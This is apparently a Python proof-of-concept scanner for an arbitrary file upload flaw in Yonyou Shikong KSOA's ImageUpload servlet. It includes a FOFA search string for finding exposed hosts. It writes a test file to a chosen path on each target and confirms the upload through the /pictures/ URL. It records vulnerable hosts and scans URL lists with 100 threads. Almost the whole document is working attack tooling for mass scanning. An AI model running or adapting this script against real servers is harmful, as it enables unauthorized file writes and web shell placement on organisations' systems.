#-*- coding: utf-8 -*-
import argparse,sys,requests,time,os,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
#fofa：app="用友-时空KSOA"
def banner():
    test = """
██╗   ██╗██╗   ██╗███████╗██╗  ██╗██╗  ██╗ █████╗ ███████╗ ██████╗ 
╚██╗ ██╔╝╚██╗ ██╔╝██╔════╝██║ ██╔╝██║ ██╔╝██╔══██╗██╔════╝██╔═══██╗
 ╚████╔╝  ╚████╔╝ ███████╗█████╔╝ █████╔╝ ███████║███████╗██║   ██║
  ╚██╔╝    ╚██╔╝  ╚════██║██╔═██╗ ██╔═██╗ ██╔══██║╚════██║██║   ██║
   ██║      ██║   ███████║██║  ██╗██║  ██╗██║  ██║███████║╚██████╔╝
   ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝                                                                                                                                                                                                                                                                                                                      
                            tag:  用友时空KSOA ImageUpload uploadfile POC                                       
                                @version: 1.0.0   @author by gallopsec            
"""
    print(test)
import requests

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
           "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
           "Accept-Encoding": "gzip, deflate",
           "Referer": "****",
           "Connection": "close",
           "Upgrade-Insecure-Requests": "1"}
def poc(target):
    url = target+"/servlet/com.sksoft.bill.ImageUpload?filename=123.txt&filepath=/"
    try:
        data = "123"
        res = requests.post(url,headers=headers,data=data,timeout=5,verify=False).text
        if "/pictures/123.txt" in res:
            print(f"[+] {target} is vulable"+ f"\n打开网址进行验证(若为123则存在漏洞):"+ target + "/pictures/123.txt")
            with open("request.txt","a+",encoding="utf-8") as f:
                f.write(target+"\n")
            return True
        else:
            print(f"[-] {target} is not vulable")
            return False
    except:
        print(f"[*] {target} error")
        return False
def main():
    banner()
    parser = argparse.ArgumentParser(description='YYSKKASO uploadfile POC')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()